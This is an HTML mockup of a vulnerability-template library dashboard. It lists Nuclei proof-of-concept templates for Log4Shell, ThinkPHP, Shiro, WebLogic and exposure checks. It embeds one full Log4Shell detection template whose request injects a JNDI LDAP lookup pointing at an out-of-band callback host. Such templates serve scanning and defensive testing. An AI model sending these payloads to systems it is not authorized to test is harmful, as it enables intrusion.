<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>POC 库 · 方案 C：资产台账表</title>
<style>
	:root {
		--bg: #fafafa;
		--panel: #ffffff;
		--line: #00000012;
		--text: #000000d9;
		--dim: #00000073;
		--accent: #0960bd;
		--accent-dim: #0960bd0d;
		--mono: "SF Mono", ui-monospace, Menlo, Consolas, monospace;
	}
	* { box-sizing: border-box; margin: 0; padding: 0; }
	body {
		background: var(--bg); color: var(--text);
		font: 13px/1.6 -apple-system, "PingFang SC", "Microsoft YaHei", sans-serif;
		padding: 20px 24px 48px;
	}
	.note { text-align: center; color: var(--dim); margin-bottom: 18px; }
	.note b { color: var(--accent); }

	/* ---- 顶栏：标题 + 一行式统计 + 操作，全部收进一条横幅 ---- */
	.hero {
		background: var(--panel); border: 1px solid var(--line); border-radius: 12px;
		padding: 16px 20px; display: flex; align-items: center; gap: 20px; margin-bottom: 12px;
		box-shadow: 0 1px 2px #0000000a;
	}
	.hero .title { flex-shrink: 0; }
	.hero .title h1 { font-size: 17px; font-weight: 650; }
	.hero .title p { font-size: 12px; color: var(--dim); }
	.sevbar { flex: 1; display: flex; gap: 2px; height: 30px; border-radius: 6px; overflow: hidden; min-width: 160px; }
	.sevbar i { display: block; height: 100%; }
	.sevbar .critical { background: #cf1322; } .sevbar .high { background: #d4380d; }
	.sevbar .medium { background: #d46b08; } .sevbar .low { background: #0958d9; } .sevbar .info { background: #389e0d; }
	.sevlegend { display: flex; gap: 14px; font-size: 12px; color: var(--dim); flex-shrink: 0; font-variant-numeric: tabular-nums; }
	.sevlegend b { color: var(--text); }
	.sevlegend i { display: inline-block; width: 8px; height: 8px; border-radius: 2px; margin-right: 5px; }
	.btn {
		flex-shrink: 0; border: 1px solid var(--line); background: var(--panel); color: var(--text);
		border-radius: 8px; height: 34px; padding: 0 14px; font-size: 13px; cursor: pointer;
	}
	.btn.primary { background: var(--accent); border-color: var(--accent); color: #fff; }

	/* ---- 过滤行 ---- */
	.filters { display: flex; gap: 8px; margin-bottom: 12px; }
	.filters input[type="search"] {
		flex: 1; height: 34px; border: 1px solid var(--line); border-radius: 8px;
		background: var(--panel); padding: 0 12px; outline: none; font-size: 13px;
	}
	.filters input[type="search"]:focus { border-color: var(--accent); box-shadow: 0 0 0 2px var(--accent-dim); }
	.seg { display: flex; border: 1px solid var(--line); border-radius: 8px; overflow: hidden; background: var(--panel); }
	.seg span { padding: 0 14px; font-size: 12.5px; color: var(--dim); cursor: pointer; display: flex; align-items: center; border-right: 1px solid var(--line); }
	.seg span:last-child { border-right: none; }
	.seg span.on { background: var(--accent); color: #fff; }

	/* ---- 台账表 ---- */
	table { width: 100%; border-collapse: separate; border-spacing: 0 6px; }
	thead th {
		text-align: left; font-size: 11.5px; font-weight: 500; color: var(--dim);
		padding: 4px 14px; letter-spacing: .02em;
	}
	tbody tr { background: var(--panel); box-shadow: 0 0 0 1px var(--line); transition: box-shadow .12s; cursor: pointer; }
	tbody tr:hover { box-shadow: 0 0 0 1px #0960bd55, 0 2px 8px #0000000d; }
	tbody tr.open { box-shadow: 0 0 0 1px var(--accent), 0 2px 8px #0000000d; }
	td { padding: 9px 14px; vertical-align: middle; }
	td.mono { font-family: var(--mono); font-size: 12px; }
	td.id { color: var(--accent); }
	.badge {
		display: inline-flex; align-items: center; gap: 6px; font-size: 12px;
	}
	.badge::before { content: ""; width: 7px; height: 7px; border-radius: 50%; }
	.badge.critical::before { background: #cf1322; } .badge.critical { color: #cf1322; }
	.badge.high::before { background: #d4380d; } .badge.high { color: #d4380d; }
	.badge.medium::before { background: #d46b08; } .badge.medium { color: #d46b08; }
	.badge.low::before { background: #0958d9; } .badge.low { color: #0958d9; }
	.badge.info::before { background: #389e0d; } .badge.info { color: #389e0d; }
	td.name { font-size: 12.5px; max-width: 340px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
	.tagset { display: flex; gap: 4px; }
	.tagset span { font-family: var(--mono); font-size: 10.5px; color: var(--dim); background: #00000008; padding: 1px 6px; border-radius: 3px; }
	td.cve { color: #cf1322; font-size: 11.5px; }
	td.when { color: var(--dim); font-size: 11.5px; font-variant-numeric: tabular-nums; }
	td.op { text-align: right; white-space: nowrap; }
	td.op button { border: none; background: none; color: #0003; cursor: pointer; font-size: 12.5px; padding: 3px 7px; border-radius: 4px; }
	tr:hover td.op button { color: var(--dim); }
	td.op button:hover { color: #cf1322; background: #cf13220d; }
	.caret { display: inline-block; transition: transform .12s; color: var(--dim); font-size: 10px; }
	tr.open .caret { transform: rotate(90deg); }

	/* ---- 行内展开 ---- */
	tr.detail td {
		background: #0d1117; border-radius: 8px; padding: 0; cursor: default;
	}
	tr.detail .inner { display: flex; flex-direction: column; margin: 6px; border-radius: 6px; overflow: hidden; }
	.detail-meta {
		display: flex; gap: 16px; padding: 8px 16px; color: #8b949e; font-size: 11.5px;
		font-family: var(--mono); border-bottom: 1px solid #21262d; align-items: center;
	}
	.detail-meta .ops { margin-left: auto; display: flex; gap: 8px; }
	.detail-meta .ops button {
		background: #21262d; border: none; color: #c9d1d9; border-radius: 5px; font-size: 11px; padding: 3px 10px; cursor: pointer;
	}
	.detail pre {
		margin: 0; padding: 14px 16px; font-family: var(--mono); font-size: 11.5px; line-height: 1.7;
		color: #c9d1d9; max-height: 260px; overflow: auto;
	}
</style>
</head>
<body>
<div class="note">方案 C · <b>资产台账表</b> —— 单表 + 行内展开暗色代码块（与漏洞 hub 同族但更紧凑）。点击行展开模板全文。</div>

<div class="hero">
	<div class="title">
		<h1>POC 库</h1>
		<p>Nuclei 模板中心 · 只读供 Agent 检索</p>
	</div>
	<div class="sevbar" title="等级分布">
		<i class="critical" style="flex:9"></i><i class="high" style="flex:31"></i><i class="medium" style="flex:47"></i><i class="low" style="flex:29"></i><i class="info" style="flex:12"></i>
	</div>
	<div class="sevlegend">
		<span><i style="background:#cf1322"></i>严重 <b>9</b></span>
		<span><i style="background:#d4380d"></i>高危 <b>31</b></span>
		<span><i style="background:#d46b08"></i>中危 <b>47</b></span>
		<span><i style="background:#0958d9"></i>低危 <b>29</b></span>
		<span><i style="background:#389e0d"></i>信息 <b>12</b></span>
	</div>
	<button class="btn">导出清单</button>
	<button class="btn primary">导入 POC（yaml / zip）</button>
</div>

<div class="filters">
	<input type="search" placeholder="搜索模板 id、名称、标签或 CVE…" />
	<div class="seg">
		<span class="on">全部 128</span><span>严重 9</span><span>高危 31</span><span>中危 47</span><span>低危 29</span><span>信息 12</span>
	</div>
</div>

<table>
	<thead>
		<tr><th></th><th>模板 ID</th><th>等级</th><th>名称</th><th>标签</th><th>CVE</th><th>导入时间</th><th></th></tr>
	</thead>
	<tbody id="rows"></tbody>
</table>

<script>
	const data = [
		{ id: "CVE-2021-44228-log4j-rce", sev: "critical", name: "Apache Log4j2 JNDI 远程代码执行（Log4Shell）", tags: ["cve", "rce"], cve: "CVE-2021-44228", when: "10-12 14:03", file: "log4shell.yaml" },
		{ id: "thinkphp-5023-rce", sev: "critical", name: "ThinkPHP 5.0.23 invokefunction 远程代码执行", tags: ["rce", "thinkphp"], cve: "—", when: "10-12 14:03", file: "thinkphp.yaml" },
		{ id: "shiro-deserialization", sev: "high", name: "Apache Shiro rememberMe 反序列化命令执行", tags: ["deserialization", "shiro"], cve: "—", when: "10-11 09:41", file: "shiro.yaml" },
		{ id: "weblogic-iiop-t3-weak", sev: "high", name: "WebLogic IIOP/T3 反序列化（CVE-2020-2883）", tags: ["cve"], cve: "CVE-2020-2883", when: "10-11 09:41", file: "weblogic.yaml" },
		{ id: "springboot-env-exposure", sev: "medium", name: "Spring Boot actuator env 端点信息泄露", tags: ["exposure", "springboot"], cve: "—", when: "10-10 18:22", file: "springboot.yaml" },
		{ id: "git-config-exposure", sev: "low", name: "Git 配置文件泄露（/.git/config）", tags: ["exposure", "git"], cve: "—", when: "10-09 11:05", file: "git.yaml" },
	];
	const sevLabel = { critical: "严重", high: "高危", medium: "中危", low: "低危", info: "信息" };
	const sample = `id: CVE-2021-44228-log4j-rce

info:
  name: Apache Log4j2 JNDI Remote Code Execution (Log4Shell)
  severity: critical
  tags: cve,rce
  classification:
    cve-id: CVE-2021-44228

http:
  - method: GET
    path:
      - "{{BaseURL}}/?x=${jndi:ldap://{{interactsh-url}}/a}"
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"`;
	const rows = document.getElementById("rows");
	let openIndex = 0;
	function render() {
		rows.innerHTML = data.map((d, i) => {
			const main = `<tr class="${i === openIndex ? "open" : ""}" onclick="toggle(${i})">
				<td style="width:26px"><span class="caret">▶</span></td>
				<td class="mono id">${d.id}</td>
				<td><span class="badge ${d.sev}">${sevLabel[d.sev]}</span></td>
				<td class="name">${d.name}</td>
				<td><span class="tagset">${d.tags.map((t) => `<span>${t}</span>`).join("")}</span></td>
				<td class="mono cve">${d.cve}</td>
				<td class="when">${d.when}</td>
				<td class="op"><button title="删除">✕ 删除</button></td>
			</tr>`;
			const detail = i === openIndex
				? `<tr class="detail" onclick="event.stopPropagation()"><td colspan="8"><div class="inner">
						<div class="detail-meta">
							<span>来源 ${d.file}</span><span>导入 ${d.when}</span><span>${d.tags.join(", ")}</span>
							<span class="ops"><button>复制全文</button><button style="color:#f85149;background:#da363326">删除模板</button></span>
						</div>
						<pre>${sample}</pre>
					</div></td></tr>`
				: "";
			return main + detail;
		}).join("");
	}
	function toggle(i) { openIndex = openIndex === i ? -1 : i; render(); }
	render();
</script>
</body>
</html>
